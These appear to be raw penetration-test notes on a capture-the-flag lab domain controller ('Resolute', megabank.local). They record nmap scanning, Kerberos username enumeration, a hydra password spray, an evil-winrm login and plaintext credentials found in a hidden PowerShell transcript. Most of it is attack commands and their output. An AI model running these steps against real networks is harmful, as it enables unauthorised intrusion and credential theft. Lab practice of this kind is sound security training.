@@ -1,0 +1,271 @@
+Nmap scan report for 10.10.10.169
+Host is up (0.11s latency).
+Not shown: 989 closed ports
+PORT     STATE SERVICE      VERSION
+53/tcp   open  domain?
+| fingerprint-strings: 
+|   DNSVersionBindReqTCP: 
+|     version
+|_    bind
+88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-05-20 22:33:36Z)
+135/tcp  open  msrpc        Microsoft Windows RPC
+139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
+389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGABANK)
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: megabank.local, Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port53-TCP:V=7.80%I=7%D=5/20%Time=5EC5ADBD%P=x86_64-pc-linux-gnu%r(DNSV
+SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
+SF:x04bind\0\0\x10\0\x03");
+Service Info: Host: RESOLUTE; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 2h30m47s, deviation: 4h02m30s, median: 10m46s
+| smb-os-discovery: 
+|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
+|   Computer name: Resolute
+|   NetBIOS computer name: RESOLUTE\x00
+|   Domain name: megabank.local
+|   Forest name: megabank.local
+|   FQDN: Resolute.megabank.local
+|_  System time: 2020-05-20T15:36:00-07:00
+| smb-security-mode: 
+|   account_used: <blank>
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: required
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2020-05-20T22:35:59
+|_  start_date: 2020-05-20T14:50:45
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 300.93 seconds
+
+
+
+
+
+
+
+
+Administrator
+DefaultAccount
+krbtgt
+ryan
+marko
+sunita
+abigail
+marcus
+sally
+fred
+angela
+felicia
+gustavo
+ulf
+stevie
+claire
+paulo
+steve
+annette
+annika
+per
+claude
+melanie
+zach
+simon
+naoki
+
+
+nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='MEGABANK.local',userdb=/root/Downloads/resolute/names.txt 10.10.10.169
+
+
+PORT   STATE SERVICE
+88/tcp open  kerberos-sec
+| krb5-enum-users: 
+| Discovered Kerberos principals
+|     felicia@MEGABANK.local
+|     ryan@MEGABANK.local
+|     claire@MEGABANK.local
+|     fred@MEGABANK.local
+|     per@MEGABANK.local
+|     stevie@MEGABANK.local
+|     zach@MEGABANK.local
+|     sunita@MEGABANK.local
+|     steve@MEGABANK.local
+NSE Timing: About 94.32% done; ETC: 18:26 (0:00:02 remaining)
+Stats: 0:03:38 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+|     marko@MEGABANK.local
+|     abigail@MEGABANK.local
+|     gustavo@MEGABANK.local
+|     naoki@MEGABANK.local
+|     simon@MEGABANK.local
+|     Administrator@MEGABANK.local
+|     sally@MEGABANK.local
+|     angela@MEGABANK.local
+|     paulo@MEGABANK.local
+|     marcus@MEGABANK.local
+|     melanie@MEGABANK.local
+|     annika@MEGABANK.local
+|     ulf@MEGABANK.local
+|     claude@MEGABANK.local
+|_    annette@MEGABANK.local
+
+
+hydra -L /root/Downloads/resolute/names.txt -p Welcome123! 10.10.10.169 smb
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-05-20 18:50:16
+[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
+[DATA] max 1 task per 1 server, overall 1 task, 26 login tries (l:26/p:1), ~26 tries per task
+[DATA] attacking smb://10.10.10.169:445/
+[445][smb] host: 10.10.10.169   login: melanie   password: Welcome123!
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-05-20 18:50:36
+
+ruby evil-winrm.rb -i 10.10.10.169 -u melanie -p 'Welcome123!'    
+
+0c3be45fcfe249796ccbee8d3a978540
+
+
+ls -hidden shows more 
+
+shows hidden powershell transcript
+
+Windows PowerShell transcript start
+Start time: 20191203063515
+Username: MEGABANK\ryan
+RunAs User: MEGABANK\ryan
+Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
+Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
+Process ID: 2800
+PSVersion: 5.1.14393.2273
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
+BuildVersion: 10.0.14393.2273
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+
+running hidden powershell transcript shows us 
+    ryan Serv3r4Admin4cc123!
+
+
+
+**********************
+Windows PowerShell transcript start
+Start time: 20191203063201
+Username: MEGABANK\ryan
+RunAs User: MEGABANK\ryan
+Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
+Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
+Process ID: 2800
+PSVersion: 5.1.14393.2273
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
+BuildVersion: 10.0.14393.2273
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+**********************
+Command start time: 20191203063455
+**********************
+PS>TerminatingError(): "System error."
+>> CommandInvocation(Invoke-Expression): "Invoke-Expression"
+>> ParameterBinding(Invoke-Expression): name="Command"; value="-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+>> CommandInvocation(Out-String): "Out-String"
+>> ParameterBinding(Out-String): name="Stream"; value="True"
+**********************
+Command start time: 20191203063455
+**********************
+PS>ParameterBinding(Out-String): name="InputObject"; value="PS megabank\ryan@RESOLUTE Documents> "
+PS megabank\ryan@RESOLUTE Documents>
+**********************
+Command start time: 20191203063515
+**********************
+PS>CommandInvocation(Invoke-Expression): "Invoke-Expression"
+>> ParameterBinding(Invoke-Expression): name="Command"; value="cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
+
+if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
+>> CommandInvocation(Out-String): "Out-String"
+>> ParameterBinding(Out-String): name="Stream"; value="True"
+**********************
+Windows PowerShell transcript start
+Start time: 20191203063515
+Username: MEGABANK\ryan
+RunAs User: MEGABANK\ryan
+Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
+Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
+Process ID: 2800
+PSVersion: 5.1.14393.2273
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
+BuildVersion: 10.0.14393.2273
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+**********************
+**********************
+Command start time: 20191203063515
+**********************
+PS>CommandInvocation(Out-String): "Out-String"
+>> ParameterBinding(Out-String): name="InputObject"; value="The syntax of this command is:"
+cmd : The syntax of this command is:
+At line:1 char:1
++ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (The syntax of this command is::String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+cmd : The syntax of this command is:
+At line:1 char:1
++ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (The syntax of this command is::String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+**********************
+Windows PowerShell transcript start
+Start time: 20191203063515
+Username: MEGABANK\ryan
+RunAs User: MEGABANK\ryan
+Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
+Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
+Process ID: 2800
+PSVersion: 5.1.14393.2273
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
+BuildVersion: 10.0.14393.2273
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+**********************
+
+
+
+*Evil-WinRM* PS C:\PSTranscripts\20191203> whoami /groups
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                 Type             SID                                            Attributes
+========================================== ================ ============================================== ===============================================================
+Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
+MEGABANK\Contractors                       Group            S-1-5-21-1392959593-3013219662-3596683436-1103 Mandatory group, Enabled by default, Enabled group
+MEGABANK\DnsAdmins                         Alias            S-1-5-21-1392959593-3013219662-3596683436-1101 Mandatory group, Enabled by default, Enabled group, Local Group
+NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
